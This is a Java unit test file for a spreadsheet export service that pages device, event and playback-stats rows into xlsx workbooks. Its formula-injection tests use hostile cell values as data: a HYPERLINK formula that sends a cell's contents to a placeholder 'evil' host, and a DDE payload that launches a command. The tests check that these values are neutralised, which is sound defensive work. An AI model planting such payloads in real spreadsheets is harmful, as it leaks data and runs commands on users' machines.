package uz.orientadvertise.services.service;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;

import org.apache.poi.ss.usermodel.CellType;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.PageImpl;
import org.springframework.data.domain.Pageable;
import uz.orientadvertise.services.domain.export.ExportType;
import uz.orientadvertise.services.domain.model.Device;
import uz.orientadvertise.services.domain.model.DeviceStatusView;
import uz.orientadvertise.services.domain.model.Event;
import uz.orientadvertise.services.domain.repository.DeviceRepository;
import uz.orientadvertise.services.domain.repository.DeviceStatusViewRepository;
import uz.orientadvertise.services.domain.repository.EventRepository;
import uz.orientadvertise.services.domain.repository.PlaybackLogRepository;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.atLeastOnce;
import static org.mockito.Mockito.atLeast;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.times;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

class ExcelExportServiceTest {

    private EventRepository eventRepository;
    private DeviceRepository deviceRepository;
    private DeviceStatusViewRepository statusViewRepository;
    private PlaybackLogRepository playbackLogRepository;
    private ExcelExportService service;

    @BeforeEach
    void setUp() {
        eventRepository = mock(EventRepository.class);
        deviceRepository = mock(DeviceRepository.class);
        statusViewRepository = mock(DeviceStatusViewRepository.class);
        playbackLogRepository = mock(PlaybackLogRepository.class);
        service = new ExcelExportService(eventRepository, deviceRepository,
                statusViewRepository, playbackLogRepository);
    }

    @Test
    void deviceExport_writesHeaderAndRow() throws Exception {
        var d = mock(Device.class);
        when(d.getId()).thenReturn(1L);
        when(d.getSerialNumber()).thenReturn("SN-1");
        when(d.getName()).thenReturn("TV-1");
        when(deviceRepository.findActivePaged(any(), any(Pageable.class)))
                .thenReturn(new PageImpl<>(List.of(d)));
        // Status cell is the heartbeat-derived computedStatus from the view, not d.getStatus().
        var statusView = mock(DeviceStatusView.class);
        when(statusView.getId()).thenReturn(1L);
        when(statusView.getComputedStatus()).thenReturn(Device.Status.ONLINE);
        when(statusViewRepository.findAllById(any())).thenReturn(List.of(statusView));

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        long deadline = System.currentTimeMillis() + 60_000;
        service.streamExport(ExportType.DEVICES,
                new ExcelExportService.ExportFilters(null, null, null, null), null, out, deadline);

        try (var wb = new XSSFWorkbook(new ByteArrayInputStream(out.toByteArray()))) {
            Sheet sheet = wb.getSheet("Devices");
            assertNotNull(sheet);
            assertEquals("ID", sheet.getRow(0).getCell(0).getStringCellValue());
            assertEquals(1.0, sheet.getRow(1).getCell(0).getNumericCellValue());
            assertEquals("SN-1", sheet.getRow(1).getCell(1).getStringCellValue());
            assertEquals("ONLINE", sheet.getRow(1).getCell(3).getStringCellValue());
        }
    }

    @Test
    void deviceExport_streamsOver10000Rows_inMultipleBatches() throws Exception {
        // 10,500 rows split into pages of BATCH_SIZE (1000). Service must page through
        // until the last batch returns hasNext=false. We stub two distinct pages and
        // assert both that the count of repository calls is correct AND that the
        // generated workbook contains all the rows.
        int totalRows = 10_500;
        int batch = ExcelExportService.BATCH_SIZE;

        when(deviceRepository.findActivePaged(any(), any(Pageable.class)))
                .thenAnswer(inv -> {
                    Pageable p = inv.getArgument(1);
                    int from = p.getPageNumber() * batch;
                    int to = Math.min(from + batch, totalRows);
                    if (from >= totalRows) return new PageImpl<>(List.of(), p, totalRows);
                    List<Device> pageContent = new ArrayList<>();
                    for (int i = from; i < to; i++) {
                        var d = mock(Device.class);
                        when(d.getId()).thenReturn((long) i);
                        when(d.getSerialNumber()).thenReturn("SN-" + i);
                        when(d.getName()).thenReturn("TV-" + i);
                        when(d.getStatus()).thenReturn(Device.Status.ONLINE);
                        pageContent.add(d);
                    }
                    return new PageImpl<>(pageContent, p, totalRows);
                });

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        long deadline = System.currentTimeMillis() + 60_000;
        service.streamExport(ExportType.DEVICES,
                new ExcelExportService.ExportFilters(null, null, null, null), null, out, deadline);

        // 10,500 rows means pages 0..10 (11 pages, the last one partial). ceil(10500/1000) = 11.
        verify(deviceRepository, atLeast(11)).findActivePaged(any(), any(Pageable.class));

        try (var wb = new XSSFWorkbook(new ByteArrayInputStream(out.toByteArray()))) {
            Sheet sheet = wb.getSheet("Devices");
            // Header row + totalRows.
            assertEquals(totalRows, sheet.getLastRowNum(),
                    "all 10,500 device rows must appear in the workbook");
        }
    }

    @Test
    void exportRespectsDeadline_abortsBetweenBatches() throws Exception {
        // Wire the repository to return non-empty pages forever; pass a deadline already
        // in the past. The service must observe the deadline before the first fetch and
        // stop after writing only the header row.
        when(deviceRepository.findActivePaged(any(), any(Pageable.class)))
                .thenReturn(new PageImpl<>(List.of(mock(Device.class))));

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        long deadlineInPast = System.currentTimeMillis() - 1;
        service.streamExport(ExportType.DEVICES,
                new ExcelExportService.ExportFilters(null, null, null, null), null, out, deadlineInPast);

        try (var wb = new XSSFWorkbook(new ByteArrayInputStream(out.toByteArray()))) {
            Sheet sheet = wb.getSheet("Devices");
            // Header only; no data rows.
            assertEquals(0, sheet.getLastRowNum());
        }
        // Repo never called because deadline check fires before the first fetch.
        verify(deviceRepository, times(0)).findActivePaged(any(), any(Pageable.class));
    }

    // ----- AUTHZ-03: formula injection -----

    @Test
    void deviceExport_formulaLookingName_isQuotePrefixedText_valueUnchanged() throws Exception {
        String payload = "=HYPERLINK(\"http://evil/?\"&A1,\"click\")";
        var d = mock(Device.class);
        when(d.getId()).thenReturn(1L);
        when(d.getSerialNumber()).thenReturn("SN-1");
        when(d.getName()).thenReturn(payload);
        when(deviceRepository.findActivePaged(any(), any(Pageable.class)))
                .thenReturn(new PageImpl<>(List.of(d)));

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        service.streamExport(ExportType.DEVICES,
                new ExcelExportService.ExportFilters(null, null, null, null), null, out,
                System.currentTimeMillis() + 60_000);

        try (var wb = new XSSFWorkbook(new ByteArrayInputStream(out.toByteArray()))) {
            var name = wb.getSheet("Devices").getRow(1).getCell(2);
            assertEquals(CellType.STRING, name.getCellType());
            assertEquals(payload, name.getStringCellValue());
            assertTrue(name.getCellStyle().getQuotePrefixed(), "editing the cell must not turn it into a formula");
            // An ordinary value keeps the default style.
            assertFalse(wb.getSheet("Devices").getRow(1).getCell(1).getCellStyle().getQuotePrefixed());
        }
    }

    @Test
    void eventsExport_formulaLookingPayload_isQuotePrefixed() throws Exception {
        var event = mock(Event.class);
        when(event.getId()).thenReturn(100L);
        when(event.getEventType()).thenReturn("OFFLINE");
        when(event.getPayload()).thenReturn("@SUM(1+1)*cmd|' /C calc'!A0");
        when(eventRepository.findFiltered(any(), any(), any(), any(), any(), any(), any(Pageable.class)))
                .thenReturn(new PageImpl<Event>(List.of(event)));

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        service.streamExport(ExportType.EVENTS,
                new ExcelExportService.ExportFilters(null, null, null, null), null, out,
                System.currentTimeMillis() + 60_000);

        try (var wb = new XSSFWorkbook(new ByteArrayInputStream(out.toByteArray()))) {
            var row = wb.getSheet("Events").getRow(1);
            assertTrue(row.getCell(6).getCellStyle().getQuotePrefixed());
            assertFalse(row.getCell(4).getCellStyle().getQuotePrefixed());
        }
    }

    @Test
    void looksLikeFormula_coversOwaspTriggers_only() {
        for (String s : List.of("=1+1", "+1", "-1", "@A1", "\t=1", "\r=1")) {
            assertTrue(ExcelExportService.looksLikeFormula(s), s);
        }
        for (String s : List.of("", "TV-1", " =1", "1=1", "SN-1")) {
            assertFalse(ExcelExportService.looksLikeFormula(s), s);
        }
    }

    @Test
    void eventsExport_writesFilteredRows() throws Exception {
        var device = mock(Device.class);
        when(device.getId()).thenReturn(1L);
        when(device.getName()).thenReturn("TV-1");

        var event = mock(Event.class);
        when(event.getId()).thenReturn(100L);
        when(event.getOccurredAt()).thenReturn(Instant.parse("2026-05-06T00:00:00Z"));
        when(event.getDevice()).thenReturn(device);
        when(event.getEventType()).thenReturn("OFFLINE");
        when(event.getPriority()).thenReturn(Event.Priority.HIGH);
        when(event.getPayload()).thenReturn("{\"reason\":\"timeout\"}");

        when(eventRepository.findFiltered(any(), eq(7L), any(), any(), any(), any(), any(Pageable.class)))
                .thenReturn(new PageImpl<Event>(List.of(event)));

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        long deadline = System.currentTimeMillis() + 60_000;
        service.streamExport(ExportType.EVENTS,
                new ExcelExportService.ExportFilters(7L, null, null, null), null, out, deadline);

        try (var wb = new XSSFWorkbook(new ByteArrayInputStream(out.toByteArray()))) {
            Sheet sheet = wb.getSheet("Events");
            assertEquals(100.0, sheet.getRow(1).getCell(0).getNumericCellValue());
            assertEquals("OFFLINE", sheet.getRow(1).getCell(4).getStringCellValue());
            assertEquals("HIGH", sheet.getRow(1).getCell(5).getStringCellValue());
        }
    }

    @Test
    void statsExport_aggregatesPerContent() throws Exception {
        Page<Object[]> page = new PageImpl<>(List.<Object[]>of(
                new Object[]{10L, "ad.mp4", 30L, 5L},
                new Object[]{11L, "promo.mp4", 12L, 3L}));
        when(playbackLogRepository.aggregatePerContentInRange(any(), any(), any(Pageable.class)))
                .thenReturn(page);

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        long deadline = System.currentTimeMillis() + 60_000;
        service.streamExport(ExportType.STATS,
                new ExcelExportService.ExportFilters(null, null, null, null), null, out, deadline);

        try (var wb = new XSSFWorkbook(new ByteArrayInputStream(out.toByteArray()))) {
            Sheet sheet = wb.getSheet("Content Stats");
            assertEquals(10.0, sheet.getRow(1).getCell(0).getNumericCellValue());
            assertEquals("ad.mp4", sheet.getRow(1).getCell(1).getStringCellValue());
            assertEquals(30.0, sheet.getRow(1).getCell(2).getNumericCellValue());
            assertEquals(5.0, sheet.getRow(1).getCell(3).getNumericCellValue());
        }
        verify(playbackLogRepository, atLeastOnce())
                .aggregatePerContentInRange(any(), any(), any(Pageable.class));
    }

    @Test
    void deviceExport_isValidXlsx() throws Exception {
        when(deviceRepository.findActivePaged(any(), any(Pageable.class)))
                .thenReturn(new PageImpl<>(List.of()));

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        long deadline = System.currentTimeMillis() + 60_000;
        service.streamExport(ExportType.DEVICES,
                new ExcelExportService.ExportFilters(null, null, null, null), null, out, deadline);

        // First two bytes of any xlsx (zip) file are "PK". This catches catastrophic
        // failures like "wrote nothing" or "wrote raw text".
        byte[] bytes = out.toByteArray();
        assertTrue(bytes.length > 100);
        assertEquals('P', bytes[0]);
        assertEquals('K', bytes[1]);
    }
}
